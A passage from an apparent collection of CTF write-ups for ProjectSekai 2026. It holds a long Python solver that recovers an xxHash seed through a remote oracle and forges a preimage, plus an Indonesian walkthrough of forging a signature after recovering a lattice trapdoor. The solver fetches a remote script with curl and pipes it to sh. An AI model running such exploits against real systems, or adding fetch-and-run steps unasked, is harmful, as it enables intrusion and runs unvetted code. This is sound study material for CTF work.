chunk:\r\n            payloads.extend(relation_messages(int(r_np), pair, bit, \"high\"))\r\n        hashes = oracle.hash_many(payloads)\r\n        for idx, r_np in enumerate(chunk):\r\n            if hashes[2*idx] == hashes[2*idx + 1]:\r\n                return int(r_np)\r\n    raise RuntimeError(\"high relation was not found\")\r\n\r\n\r\ndef common_zero_bit(low_values: np.ndarray, pair: tuple[int, int]) -> int | None:\r\n    rel = relation_low_vec(np.asarray(low_values, dtype=np.uint32), *pair)\r\n    for bit in range(32):\r\n        if np.all(((rel >> np.uint32(bit)) & np.uint32(1)) == 0):\r\n            return bit\r\n    return None\r\n\r\n\r\ndef expected_guesswork(weights: np.ndarray) -> float:\r\n    w = np.asarray(weights, dtype=np.float64)\r\n    order = np.argsort(-w, kind=\"stable\")\r\n    return float(np.dot(np.arange(1, len(w) + 1), w[order]) / w.sum())\r\n\r\n\r\ndef recover_low_half(oracle, verbose: bool = True) -> np.ndarray:\r\n    vals, weights = initial_low_distribution(*LOW_INIT)\r\n    relation = find_unknown_low_relation(oracle, vals, weights, LOW_INIT)\r\n    candidates = low_candidates_from_relation(*LOW_INIT, relation)\r\n    if verbose:\r\n        print(f\"[+] low relation {LOW_INIT}: {relation:#010x}; candidates={len(candidates)}; queries={oracle.queries}\", flush=True)\r\n\r\n    # A low-relation collision is deterministic only for opposite-parity\r\n    # secret words (+seed versus -seed).  Same-parity pairs require the\r\n    # unknown high words to share a tested bit; the old range(6) heuristic\r\n    # can therefore miss the true relation for unlucky seeds.\r\n    safe_low_filters = [pair for pair in LOW_FILTERS if (pair[0] ^ pair[1]) & 1]\r\n    for pair in safe_low_filters:\r\n        if len(candidates) <= 2:\r\n            break\r\n        rv = relation_low_vec(candidates, *pair)\r\n        vals, counts = np.unique(rv, return_counts=True)\r\n        if len(vals) <= 1:\r\n            continue\r\n        relation = find_unknown_low_relation(oracle, vals, counts, pair)\r\n        candidates = candidates[rv == np.uint32(relation)]\r\n        if verbose:\r\n            print(f\"[+] low filter {pair}: remain={len(candidates)}; queries={oracle.queries}\", flush=True)\r\n    return candidates\r\n\r\n\r\ndef high_pair_pool(low_candidates: np.ndarray, verbose: bool = True, limit: int = 6):\r\n    coarse = []\r\n    for i, j, length in OPPOSITE_PAIRS:\r\n        if common_zero_bit(low_candidates, (i, j)) is None:\r\n            continue\r\n        qs = sorted(set(qhigh_pair(int(x), i, j) for x in low_candidates))\r\n        coarse.append((count_relation_union(qs), length, (i, j)))\r\n\r\n    pool = []\r\n    for _, length, pair in sorted(coarse)[:limit]:\r\n        vals, weights = initial_high_distribution(low_candidates, *pair)\r\n        expected = expected_guesswork(weights)\r\n        pool.append({\r\n            \"pair\": pair,\r\n            \"length\": length,\r\n            \"vals\": vals,\r\n            \"weights\": weights,\r\n            \"expected\": expected,\r\n        })\r\n        if verbose:\r\n            print(\r\n                f\"[*] high pool {pair}: relations={len(vals)}, \"\r\n                f\"expected-tests={expected:.1f}, max-preimages={int(weights.max())}\",\r\n                flush=True,\r\n            )\r\n    pool.sort(key=lambda x: (x[\"expected\"], x[\"length\"]))\r\n    return pool\r\n\r\n\r\ndef choose_filter_pair(seed_lows: np.ndarray, seed_highs: np.ndarray):\r\n    count = len(seed_highs)\r\n    unique_lows = np.unique(seed_lows)\r\n    best = None\r\n    for i, j, length in ALL_PAIRS:\r\n        bit = common_zero_bit(unique_lows, (i, j))\r\n        if bit is None:\r\n            continue\r\n        rv = relation_high_vec(seed_lows, seed_highs, i, j)\r\n        vals, weights = np.unique(rv, return_counts=True)\r\n        if len(vals) <= 1:\r\n            continue\r\n        probabilities = weights.astype(np.float64) / count\r\n        entropy = float(-np.sum(probabilities * np.log2(probabilities)))\r\n        if entropy <= 0:\r\n            continue\r\n        expected = expected_guesswork(weights)\r\n        expected_remaining = float(np.dot(weights.astype(np.float64), weights.astype(np.float64)) / count)\r\n        key = (expected * length / entropy, expected_remaining, expected * length)\r\n        if best is None or key < best[0]:\r\n            best = (key, (i, j), bit, rv, vals, weights)\r\n    if best is None:\r\n        raise RuntimeError(\"no useful high-half filter\")\r\n    return best\r\n\r\n\r\ndef recover_seed(oracle, verbose: bool = True) -> int:\r\n    low_candidates = recover_low_half(oracle, verbose)\r\n    pool = high_pair_pool(low_candidates, verbose)\r\n\r\n    relations: list[tuple[tuple[int, int], int, int]] = []\r\n    for entry in pool:\r\n        pair = entry[\"pair\"]\r\n        bit = common_zero_bit(low_candidates, pair)\r\n        assert bit is not None\r\n        relation = find_known_high_relation(\r\n            oracle, entry[\"vals\"], entry[\"weights\"], pair, bit\r\n        )\r\n        pos = np.where(entry[\"vals\"] == np.uint32(relation))[0]\r\n        preimages = int(entry[\"weights\"][pos[0]]) if len(pos) else (1 << 32)\r\n        relations.append((pair, relation, preimages))\r\n        if verbose:\r\n            print(\r\n                f\"[+] high relation {pair}: {relation:#010x}; \"\r\n                f\"preimages={preimages}; queries={oracle.queries}\",\r\n                flush=True,\r\n            )\r\n        if len(relations) >= 2 and min(x[2] for x in relations) <= 1_000_000:\r\n            break\r\n        if len(relations) >= 3:\r\n            break\r\n\r\n    base = min(relations, key=lambda x: x[2])\r\n    other_relations = [item for item in relations if item is not base]\r\n    low_parts: list[np.ndarray] = []\r\n    high_parts: list[np.ndarray] = []\r\n\r\n    for low_np in low_candidates:\r\n        low = int(low_np)\r\n        highs = high_candidates_from_relation(low, *base[0], base[1])\r\n        if len(highs) == 0:\r\n            continue\r\n        lows = np.full(len(highs), np.uint32(low), dtype=np.uint32)\r\n        for pair, relation, _ in other_relations:\r\n            keep = relation_high_vec(lows, highs, *pair) == np.uint32(relation)\r\n            lows = lows[keep]\r\n            highs = highs[keep]\r\n            if len(highs) == 0:\r\n                break\r\n        if len(highs):\r\n            low_parts.append(lows)\r\n            high_parts.append(highs)\r\n\r\n    if not high_parts:\r\n        raise RuntimeError(\"all high-half candidates were eliminated\")\r\n    seed_lows = np.concatenate(low_parts)\r\n    seed_highs = np.concatenate(high_parts)\r\n    if verbose:\r\n        print(f\"[+] intersected seed candidates: {len(seed_highs)}\", flush=True)\r\n\r\n    rounds = 0\r\n    for pair in LOW_FILTERS:\r\n        if len(seed_highs) <= 200_000:\r\n            break\r\n        bit = common_zero_bit(np.unique(seed_lows), pair)\r\n        if bit is None:\r\n            continue\r\n        rv = relation_high_vec(seed_lows, seed_highs, *pair)\r\n        vals, counts = np.unique(rv, return_counts=True)\r\n        if len(vals) <= 1:\r\n            continue\r\n        relation = find_known_high_relation(oracle, vals, counts, pair, bit)\r\n        keep = rv == np.uint32(relation)\r\n        seed_lows = seed_lows[keep]\r\n        seed_highs = seed_highs[keep]\r\n        rounds += 1\r\n        if verbose:\r\n            print(f\"[+] high fixed filter {pair}: remain={len(seed_highs)}; queries={oracle.queries}\", flush=True)\r\n\r\n    while len(seed_highs) > 8 and rounds < 16:\r\n        _, pair, bit, rv, vals, counts = choose_filter_pair(seed_lows, seed_highs)\r\n        relation = find_known_high_relation(oracle, vals, counts, pair, bit)\r\n        keep = rv == np.uint32(relation)\r\n        seed_lows = seed_lows[keep]\r\n        seed_highs = seed_highs[keep]\r\n        rounds += 1\r\n        if verbose:\r\n            print(f\"[+] high filter {pair}: remain={len(seed_highs)}; queries={oracle.queries}\", flush=True)\r\n\r\n    probe = bytes(320)\r\n    expected = oracle.hash_one(probe)\r\n    seeds = []\r\n    for low_np, high_np in zip(seed_lows, seed_highs):\r\n        seed = (int(high_np) << 32) | int(low_np)\r\n        if xxh_hex(probe, seed) == expected:\r\n            seeds.append(seed)\r\n    if len(seeds) != 1:\r\n        raise RuntimeError(f\"seed validation produced {len(seeds)} candidates\")\r\n    return seeds[0]\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n# Invert one fold128(c, y) with a small lattice\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\ndef invert_fold_once(\r\n    c: int,\r\n    target: int,\r\n    rng: random.Random,\r\n    block: int,\r\n    scale: int,\r\n    marker: int,\r\n    loops: int,\r\n) -> int | None:\r\n    if c == 0:\r\n        return 0 if target == 0 else None\r\n\r\n    n = 64\r\n    dim = 66\r\n    raw = [\r\n        ((1 << j) * ((1 << 64) + 1 - 2 * ((target >> j) & 1))) % c\r\n        for j in range(n)\r\n    ]\r\n    permutation = list(range(n))\r\n    rng.shuffle(permutation)\r\n\r\n    basis = IntegerMatrix(dim, dim)\r\n    for row, bit in enumerate(permutation):\r\n        basis[row, row] = 2\r\n        lift = rng.randint(-3, 3)\r\n        basis[row, 65] = scale * (raw[bit] + lift * c)\r\n    for row in range(n):\r\n        basis[64, row] = 1\r\n    basis[64, 64] = marker\r\n    basis[64, 65] = scale * ((-target) % c + rng.randint(-3, 3) * c)\r\n    basis[65, 65] = scale * c\r\n\r\n    LLL.reduction(basis, delta=0.999, eta=0.501)\r\n    BKZ.reduction(\r\n        basis,\r\n        BKZ.Param(block_size=block, max_loops=loops, flags=BKZ.AUTO_ABORT),\r\n    )\r\n\r\n    for row_idx in range(dim):\r\n        row = [int(basis[row_idx, col]) for col in range(dim)]\r\n        for sign in (1, -1):\r\n            v = [sign * x for x in row]\r\n            if abs(v[64]) != marker or v[65] != 0:\r\n                continue\r\n            if not all(abs(v[i]) == 1 for i in range(64)):\r\n                continue\r\n            if v[64] == -marker:\r\n                bits = [(v[i] + 1) // 2 for i in range(64)]\r\n            else:\r\n                bits = [(-v[i] + 1) // 2 for i in range(64)]\r\n            high_product = 0\r\n            for perm_idx, bit_value in enumerate(bits):\r\n                high_product |= bit_value << permutation[perm_idx]\r\n            numerator = high_product * (1 << 64) + (target ^ high_product)\r\n            if numerator % c:\r\n                continue\r\n            y = numerator // c\r\n            if y < (1 << 64) and fold128(c, y) == target:\r\n                return y\r\n    return None\r\n\r\n\r\ndef invert_fold(c: int, target: int, rng: random.Random, attempts: int = 12) -> int | None:\r\n    for attempt in range(attempts):\r\n        result = invert_fold_once(\r\n            c,\r\n            target,\r\n            rng,\r\n            block=20 + 2 * (attempt % 5),\r\n            scale=1 << (8 + 2 * (attempt % 5)),\r\n            marker=(1, 2, 4)[attempt % 3],\r\n            loops=4 + (attempt % 3),\r\n        )\r\n        if result is not None:\r\n            return result\r\n    return None\r\n\r\n\r\ndef solve_pair_sum(c0: int, c1: int, target: int, rng: random.Random) -> tuple[int, int]:\r\n    for _ in range(50):\r\n        y0 = rng.getrandbits(64)\r\n        remaining = (target - fold128(c0, y0)) & MASK64\r\n        y1 = invert_fold(c1, remaining, rng, attempts=5)\r\n        if y1 is not None:\r\n            assert (fold128(c0, y0) + fold128(c1, y1)) & MASK64 == target\r\n            return y0, y1\r\n    raise RuntimeError(\"failed to invert fold128 pair sum\")\r\n\r\n\r\ndef target_accumulators(seed: int, rng: random.Random) -> list[int]:\r\n    secret = custom_secret(seed)\r\n    target_high = int.from_bytes(TARGET[:8], \"big\")\r\n    target_low = int.from_bytes(TARGET[8:], \"big\")\r\n    pre_low = inverse_avalanche(target_low)\r\n    pre_high = inverse_avalanche(target_high)\r\n    need_low = (pre_low - 320 * P64_1) & MASK64\r\n    need_high = (pre_high - ((~(320 * P64_2)) & MASK64)) & MASK64\r\n\r\n    low_keys = [\r\n        (u64(secret, 11 + 16*i), u64(secret, 19 + 16*i))\r\n        for i in range(4)\r\n    ]\r\n    high_keys = [\r\n        (u64(secret, 117 + 16*i), u64(secret, 125 + 16*i))\r\n        for i in range(4)\r\n    ]\r\n\r\n    acc = [0] * 8\r\n    c0 = high_keys[0][0] ^ low_keys[0][0]\r\n    c1 = high_keys[1][0] ^ low_keys[1][0]\r\n    y0, y1 = solve_pair_sum(c0, c1, need_low, rng)\r\n    for pair_index, y in ((0, y0), (1, y1)):\r\n        acc[2*pair_index] = high_keys[pair_index][0]\r\n        acc[2*pair_index+1] = low_keys[pair_index][1] ^ y\r\n\r\n    c2 = low_keys[2][0] ^ high_keys[2][0]\r\n    c3 = low_keys[3][0] ^ high_keys[3][0]\r\n    y2, y3 = solve_pair_sum(c2, c3, need_high, rng)\r\n    for pair_index, y in ((2, y2), (3, y3)):\r\n        acc[2*pair_index] = low_keys[pair_index][0]\r\n        acc[2*pair_index+1] = high_keys[pair_index][1] ^ y\r\n\r\n    # Exact merge verification.\r\n    low = (320 * P64_1) & MASK64\r\n    high = (~(320 * P64_2)) & MASK64\r\n    for i in range(4):\r\n        low = (low + fold128(acc[2*i] ^ low_keys[i][0], acc[2*i+1] ^ low_keys[i][1])) & MASK64\r\n        high = (high + fold128(acc[2*i] ^ high_keys[i][0], acc[2*i+1] ^ high_keys[i][1])) & MASK64\r\n    if low != pre_low or high != pre_high:\r\n        raise RuntimeError(\"target accumulator merge verification failed\")\r\n    return acc\r\n\r\n\r\ndef build_payload(seed: int, desired_acc: list[int]) -> bytes:\r\n    secret = custom_secret(seed)\r\n    fixed = INIT_ACC.copy()\r\n    # Stripes 2, 3 and the mandatory final stripe remain zero.\r\n    for secret_offset in (16, 24, 121):\r\n        for lane in range(8):\r\n            key = u64(secret, secret_offset + 8*lane)\r\n            fixed[lane] = (fixed[lane] + (key & MASK32) * (key >> 32)) & MASK64\r\n\r\n    data = bytearray(320)\r\n    for source_lane in range(8):\r\n        target_lane = source_lane ^ 1\r\n        needed_sum = (desired_acc[target_lane] - fixed[target_lane]) & MASK64\r\n        key0 = u64(secret, 8*source_lane)\r\n        key1 = u64(secret, 8 + 8*source_lane)\r\n        key0_low = key0 & MASK32\r\n        key1_high = key1 >> 32\r\n\r\n        low1 = ((needed_sum & MASK32) - key0_low) & MASK32\r\n        carry = (key0_low + low1) >> 32\r\n        high0 = ((needed_sum >> 32) - key1_high - carry) & MASK32\r\n        word0 = (high0 << 32) | key0_low\r\n        word1 = (key1_high << 32) | low1\r\n\r\n        # The product contribution in stripe 0/1 is zero by construction.\r\n        assert ((word0 ^ key0) & MASK32) == 0\r\n        assert ((word1 ^ key1) >> 32) == 0\r\n        data[8*source_lane:8*source_lane+8] = word0.to_bytes(8, \"little\")\r\n        data[64+8*source_lane:64+8*source_lane+8] = word1.to_bytes(8, \"little\")\r\n\r\n    _, _, actual_acc = model_hash_320(bytes(data), seed)\r\n    if actual_acc != desired_acc:\r\n        raise RuntimeError(\"payload accumulator verification failed\")\r\n    if xxh_digest(bytes(data), seed) != TARGET:\r\n        raise RuntimeError(\"payload digest verification failed\")\r\n    return bytes(data)\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n# Remote protocol\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\nclass RemoteOracle:\r\n    POW_URL = \"https://pwn.red/pow\"\r\n\r\n    def __init__(self, host: str, port: int):\r\n        self.sock = socket.create_connection((host, port), timeout=15)\r\n        self.sock.settimeout(120)\r\n        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\r\n        if hasattr(socket, \"TCP_QUICKACK\"):\r\n            try:\r\n                self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)\r\n            except OSError:\r\n                pass\r\n        self.buffer = b\"\"\r\n        self.queries = 0\r\n        self._solve_pow()\r\n\r\n    def _recv_until(self, marker: bytes) -> bytes:\r\n        \"\"\"Receive through marker while preserving bytes that follow it.\"\"\"\r\n        while True:\r\n            pos = self.buffer.find(marker)\r\n            if pos >= 0:\r\n                end = pos + len(marker)\r\n                data = self.buffer[:end]\r\n                self.buffer = self.buffer[end:]\r\n                return data\r\n\r\n            chunk = self.sock.recv(65536)\r\n            self._quick_ack()\r\n            if not chunk:\r\n                raise EOFError(\r\n                    \"remote closed the connection during the PoW handshake: \"\r\n                    + self.buffer.decode(errors=\"replace\")\r\n                )\r\n            self.buffer += chunk\r\n\r\n    def _solve_pow(self) -> None:\r\n        \"\"\"Solve the pwn.red proof-of-work challenge announced by the server.\"\"\"\r\n        banner = self._recv_until(b\"solution:\")\r\n        text = banner.decode(errors=\"replace\")\r\n        print(text, end=\"\", flush=True)\r\n\r\n        match = re.search(\r\n            r\"curl\\s+-sSfL\\s+https://pwn\\.red/pow\\s*\\|\\s*sh\\s+-s\\s+(\\S+)\",\r\n            text,\r\n        )\r\n        if match is None:\r\n            raise RuntimeError(f\"unsupported PoW banner:\\n{text}\")\r\n\r\n        challenge = match.group(1)\r\n        print(f\"[*] Solving proof of work for challenge {challenge}\", flush=True)\r\n\r\n        try:\r\n            downloader = subprocess.run(\r\n                [\"curl\", \"-sSfL\", self.POW_URL],\r\n                check=True,\r\n                stdout=subprocess.PIPE,\r\n                stderr=subprocess.PIPE,\r\n                timeout=30,\r\n            )\r\n            solver = subprocess.run(\r\n                [\"sh\", \"-s\", challenge],\r\n                input=downloader.stdout,\r\n                check=True,\r\n                stdout=subprocess.PIPE,\r\n                stderr=subprocess.PIPE,\r\n                timeout=300,\r\n            )\r\n        except FileNotFoundError as exc:\r\n            raise RuntimeError(\"curl or sh is not installed\") from exc\r\n        except subprocess.TimeoutExpired as exc:\r\n            raise RuntimeError(\"proof-of-work solver timed out\") from exc\r\n        except subprocess.CalledProcessError as exc:\r\n            stderr = exc.stderr.decode(errors=\"replace\") if exc.stderr else \"\"\r\n            raise RuntimeError(f\"proof-of-work solver failed: {stderr}\") from exc\r\n\r\n        lines = [line.strip() for line in solver.stdout.splitlines() if line.strip()]\r\n        if not lines:\r\n            stderr = solver.stderr.decode(errors=\"replace\")\r\n            raise RuntimeError(f\"proof-of-work solver returned no solution: {stderr}\")\r\n\r\n        solution = lines[-1]\r\n        print(f\"[+] PoW solution: {solution.decode(errors='replace')}\", flush=True)\r\n        self.sock.sendall(solution + b\"\\n\")\r\n\r\n    def _quick_ack(self) -> None:\r\n        if hasattr(socket, \"TCP_QUICKACK\"):\r\n            try:\r\n                self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)\r\n            except OSError:\r\n                pass\r\n\r\n    def _receive_hashes(self, count: int) -> list[str]:\r\n        marker = b\"[+] Hash: \"\r\n        found: list[str] = []\r\n        while len(found) < count:\r\n            while True:\r\n                pos = self.buffer.find(marker)\r\n                if pos < 0 or len(self.buffer) < pos + len(marker) + 32:\r\n                    break\r\n                value = self.buffer[pos + len(marker):pos + len(marker) + 32]\r\n                if all(c in b\"0123456789abcdef\" for c in value):\r\n                    found.append(value.decode())\r\n                    self.buffer = self.buffer[pos + len(marker) + 32:]\r\n                    if len(found) == count:\r\n                        return found\r\n                else:\r\n                    self.buffer = self.buffer[pos + 1:]\r\n            chunk = self.sock.recv(1 << 20)\r\n            self._quick_ack()\r\n            if not chunk:\r\n                raise EOFError(\"remote closed the connection\")\r\n            self.buffer += chunk\r\n        return found\r\n\r\n    def hash_many(self, payloads: list[bytes]) -> list[str]:\r\n        if not payloads:\r\n            return []\r\n        request = bytearray()\r\n        for payload in payloads:\r\n            request += b\"1\\n\" + payload.hex().encode() + b\"\\n\"\r\n\r\n        send_errors: list[BaseException] = []\r\n\r\n        def sender() -> None:\r\n            try:\r\n                self.sock.sendall(request)\r\n            except BaseException as exc:  # propagated after receive unblocks\r\n                send_errors.append(exc)\r\n\r\n        thread = threading.Thread(target=sender, daemon=True)\r\n        thread.start()\r\n        result = self._receive_hashes(len(payloads))\r\n        thread.join()\r\n        if send_errors:\r\n            raise send_errors[0]\r\n        self.queries += len(payloads)\r\n        return result\r\n\r\n    def hash_one(self, payload: bytes) -> str:\r\n        return self.hash_many([payload])[0]\r\n\r\n    def submit(self, payload: bytes) -> str:\r\n        self.sock.sendall(b\"2\\n\" + payload.hex().encode() + b\"\\n\")\r\n        data = self.buffer\r\n        self.buffer = b\"\"\r\n        self.sock.settimeout(20)\r\n        while True:\r\n            match = re.search(rb\"SEKAI\\{[^\\r\\n}]*\\}\", data)\r\n            if match:\r\n                return match.group().decode()\r\n            try:\r\n                chunk = self.sock.recv(65536)\r\n            except socket.timeout as exc:\r\n                raise RuntimeError(data.decode(errors=\"replace\")) from exc\r\n            if not chunk:\r\n                raise RuntimeError(data.decode(errors=\"replace\"))\r\n            data += chunk\r\n\r\n\r\nclass LocalOracle:\r\n    def __init__(self, seed: int):\r\n        self.seed = seed\r\n        self.queries = 0\r\n\r\n    def hash_many(self, payloads: list[bytes]) -> list[str]:\r\n        self.queries += len(payloads)\r\n        return [xxh_hex(payload, self.seed) for payload in payloads]\r\n\r\n    def hash_one(self, payload: bytes) -> str:\r\n        return self.hash_many([payload])[0]\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n# Entry point\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"host\", nargs=\"?\", default=\"iihash.chals.sekai.team\")\r\n    parser.add_argument(\"port\", nargs=\"?\", type=int, default=1337)\r\n    parser.add_argument(\"--local-seed\", type=lambda x: int(x, 0), help=\"run a local end-to-end self-test\")\r\n    args = parser.parse_args()\r\n\r\n    started = time.time()\r\n    if args.local_seed is not None:\r\n        oracle = LocalOracle(args.local_seed & MASK64)\r\n    else:\r\n        print(f\"[*] Connecting to {args.host}:{args.port}\", flush=True)\r\n        oracle = RemoteOracle(args.host, args.port)\r\n\r\n    seed = recover_seed(oracle, verbose=True)\r\n    print(f\"[+] Recovered seed: {seed:#018x}\", flush=True)\r\n\r\n    rng = random.Random(seed)\r\n    desired_acc = target_accumulators(seed, rng)\r\n    payload = build_payload(seed, desired_acc)\r\n    print(f\"[+] Preimage ready: {len(payload)} bytes\", flush=True)\r\n    print(f\"[+] Local digest: {xxh_digest(payload, seed)!r}\", flush=True)\r\n\r\n    if args.local_seed is not None:\r\n        assert seed == (args.local_seed & MASK64)\r\n        print(f\"[+] Self-test passed in {time.time() - started:.2f}s with {oracle.queries} queries\")\r\n        return\r\n\r\n    flag = oracle.submit(payload)\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "SEKAI{Im4g1n3_U5iNg_LLL_!n_d1ff3rEn7IAL_Cryp7aN@lySis}",
    "lessonsLearned": ""
  },
  {
    "id": "projectsekai2026-crypto-needleinamultivariatesekai",
    "title": "needLe in a multivariate sekai",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "**Category:** Crypto  \n**CTF:** SEKAI CTF 2026  \n**Difficulty:** Hard  \n**Flag:** `SEKAI{y0U_f0uND_th3_n33dL3!!!_https://youtu.be/Sloi-L5FHBY}`",
    "problemDescription": "Public key merupakan quadratic form 144 dimensi yang disamarkan dengan transformasi unimodular. Challenge juga memberikan 200 signature untuk pesan yang diketahui.\n\nSignature tersebut bukan sekadar contoh. Setelah setiap sampel dinormalisasi dengan parameter Gaussian-nya, baris transformasi rahasia menjadi vektor-vektor pendek pada lattice transcript. LLL/BKZ dan `g6k` cukup untuk memulihkan transformasi unimodular, membuka kembali bentuk block matrix, lalu membuat signature valid untuk pesan `STAGE OF SEKAI`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "File yang diberikan",
        "content": "`gen.py` membuat key pair dan membocorkan 200 signature:\n\n\n\nServer meminta satu signature untuk pesan tetap:\n\n\n\nJadi targetnya adalah existential forgery untuk public key yang sama.",
        "code": "gen.py\nserver.py\nsig.py\nutils.py\npk.sobj\noutput.txt"
      },
      {
        "title": "Struktur skema",
        "content": "Parameter default:\n\n\n\nSebelum disamarkan, public quadratic form memiliki bentuk:\n\n\n\n`p` dan `q` adalah prime sekitar 80 bit. Matriks `M2` juga sengaja memiliki empat baris nol:\n\n\n\nKeygen lalu membuat matriks unimodular `U` dari 40 lapisan permutasi dan row shear kecil:\n\n\n\nSigner membentuk vektor tersembunyi `x`, kemudian mengeluarkan:\n\n\n\nKarena itu:\n\n\n\nUntuk pesan `msg`, nilai targetnya adalah:",
        "code": "m = 128\nk = 8\nn = m + 2k = 144\nB1 = 2^80\nB0 = 2^40"
      },
      {
        "title": "Kebocoran dari 200 signature",
        "content": "Misalkan setiap signature publik adalah kolom `s_i`. Dari proses signing:\n\n\n\nmaka:\n\n\n\nBuat matriks transcript `S` berukuran `144 x 200`, dengan signature sebagai kolom. Untuk setiap baris rahasia `u_j` dari `U`:\n\n\n\nKoordinat tersembunyi `x_i[j]` diambil dari distribusi Gaussian dengan skala yang bisa dihitung dari pesan:\n\n\n\nPesan-pesan pada transcript diketahui, yaitu `message 0` sampai `message 199`. Semua `t_i` dan `u_i` dapat dihitung ulang.\n\nSaya menormalisasi setiap kolom transcript:\n\n\n\nSetelah normalisasi, baris `U` menghasilkan 200 sampel berukuran hampir seragam. `U` sendiri juga relatif kecil karena hanya dibuat dari permutasi dan shear dengan koefisien `-2..2`.\n\nGunakan embedding:\n\n\n\nUntuk kombinasi integer `a`:\n\n\n\nJika `a` adalah sebuah baris `U`, bagian `aR` menjadi satu koordinat tersembunyi dari 200 signature. Vektor tersebut jauh lebih pendek dibanding kombinasi acak. Blok identitas mencegah reducer memilih relasi transcript dengan koefisien sangat besar.",
        "code": "s_i = U^-1 x_i"
      },
      {
        "title": "Memulihkan transformasi unimodular",
        "content": "Reduksi dilakukan bertahap:\n\n1. LLL pada embedding transcript untuk mendapat basis awal.\n2. Bentuk Gram lokal `H = Y Y^T`, dengan `Y = T R` dan `T` sebagai transformasi yang sedang dilacak.\n3. Jalankan beberapa pass BKZ block size 20 sampai 35 pada Gram matrix tersebut.\n4. Bangun ulang embedding `[T R | I]`.\n5. Jalankan `g6k` pump/sieving beberapa kali.\n\nPotongan inti embedding:\n\n\n\nSesudah BKZ lokal, `g6k` dijalankan pada embedding yang sudah terkondisi:\n\n\n\nPump diulang dengan seed berbeda. Pada hasil akhir, seluruh 144 vektor memiliki norm transcript sekitar 56–57 bit. Right block embedding memberi transformasi tambahan `R_g6k`, sehingga kandidat transformasi penuh adalah:\n\n\n\nKandidat yang benar memiliki determinant `-1`, sehingga tetap unimodular.",
        "code": "N = 144\nK = 200\nL = 24\n\nraw = []\nfor j in range(N):\n    row = []\n    for i in range(K):\n        row.append(round((signatures[i][j] << L) / gaussian_scales[i]))\n    raw.append(row)\n\nbasis = [\n    raw[i] + [1 if i == j else 0 for j in range(N)]\n    for i in range(N)\n]"
      },
      {
        "title": "Validasi recovery",
        "content": "Public matrix asli dipulihkan dengan:\n\n\n\nHasilnya menunjukkan struktur yang tidak mungkin muncul secara kebetulan:\n\n\n\nKedua nilai tersebut muncul tepat delapan kali pada diagonal. Selain itu ditemukan:\n\n- dua kelompok diagonal berukuran delapan untuk block `p I_8` dan `q I_8`;\n- tepat empat koordinat `x1` yang tidak memiliki coupling ke block `q`, sesuai `M2[:4, :] = 0`;\n- 152 entri off-diagonal nol yang mengembalikan struktur block matrix;\n- `det(U_recovered) = -1`.\n\nIni cukup untuk memastikan transformasi yang dipulihkan memang trapdoor asli, walaupun urutan dan tanda koordinat dapat berbeda.",
        "code": "A = U_recovered^-T * M_public * U_recovered^-1"
      },
      {
        "title": "Menyusun ulang trapdoor",
        "content": "Dua prime dikenali dari nilai diagonal yang masing-masing berulang delapan kali. Block `q` dibedakan dari block `p` dengan mencari kelompok yang memiliki tepat empat baris `x1` tanpa coupling:\n\n\n\nSetelah koordinat diurutkan kembali menjadi:\n\n\n\nmatriks `M1`, `M2`, dan `M0` dapat diambil langsung dari block `A`.",
        "code": "def zero_rows(group):\n    return [\n        i for i in x_indices\n        if all(A[i, j] == 0 for j in group)\n    ]"
      },
      {
        "title": "Membuat signature target",
        "content": "Signer asli direplikasi dengan trapdoor hasil recovery."
      },
      {
        "title": "1. Hitung target",
        "content": "",
        "code": "message = b\"STAGE OF SEKAI\"\nt = int.from_bytes(b\"\\x01\" + sha256(message).digest(), \"big\")"
      },
      {
        "title": "2. Sampel `x1`",
        "content": "Ambil 128 bilangan Gaussian. Empat koordinat dikoreksi modulo `q`, lalu empat koordinat lain dikoreksi modulo `p`. Koreksi memakai minor `4 x 4` yang invertible:\n\n\n\nFungsi `closest_congruent` memilih wakil kongruen yang paling dekat dengan sampel Gaussian awal.",
        "code": "x1 * M2[:, q_selected] = 0 mod q\nx1 * M1[:, p_selected] = 0 mod p"
      },
      {
        "title": "3. Hitung residual",
        "content": "Untuk kolom terpilih, pembagian berikut menjadi exact integer:\n\n\n\nKemudian hitung residual target setelah kontribusi `x1` dan offset dikurangi.",
        "code": "c1 = x1 M1\nc2 = x1 M2"
      },
      {
        "title": "4. Pecah residual menjadi `a p + b q`",
        "content": "Pilih `a` yang memenuhi:\n\n\n\nTambahkan kelipatan `q` sampai `a` dan:\n\n\n\nkeduanya non-negatif.",
        "code": "a = t0 * p^-1 mod q"
      },
      {
        "title": "5. Four squares",
        "content": "Representasikan `a` dan `b` sebagai jumlah empat kuadrat:\n\n\n\nEmpat nilai tersebut mengisi koordinat terpilih pada block `p` dan `q`. Vektor canonical menjadi:\n\n\n\nTerakhir, ubah kembali ke koordinat publik:\n\n\n\nSignature hasil forge diverifikasi lokal dengan persamaan exact:",
        "code": "a = a0^2 + a1^2 + a2^2 + a3^2\nb = b0^2 + b1^2 + b2^2 + b3^2"
      },
      {
        "title": "Solver final",
        "content": "Recovery lattice hanya perlu dilakukan satu kali karena public key dan pesan target tidak berubah. `solve.py` menyimpan signature hasil forge, memverifikasinya terhadap `pk.sobj`, lalu mengirim 144 integer ke service.\n\nJalankan:\n\n\n\nUntuk hanya mengecek signature secara lokal:\n\n\n\nJika `pk.sobj` tidak berada di direktori aktif:\n\n\n\nContoh output:",
        "code": "python3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
